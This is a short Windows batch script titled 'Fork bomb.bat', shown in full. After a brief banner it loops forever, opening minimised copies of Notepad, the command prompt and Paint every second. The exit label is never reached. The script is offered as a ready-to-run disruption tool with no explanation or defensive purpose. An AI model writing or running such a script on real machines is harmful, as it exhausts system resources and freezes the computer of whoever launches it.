@echo off
title Fork bomb.bat
color 0a
mode con cols=65 lines=25
goto :echo
:echo
cls
timeout /t 0 > nul
echo start Fork bomb.bat...
timeout /t 1 > nul
cls
goto :Fork_bomb
:Fork_bomb
start /min notepad.exe
start /min cmd.exe
start /min mspaint.exe
timeout /t 1 > nul
goto :Fork_bomb
:exit
exit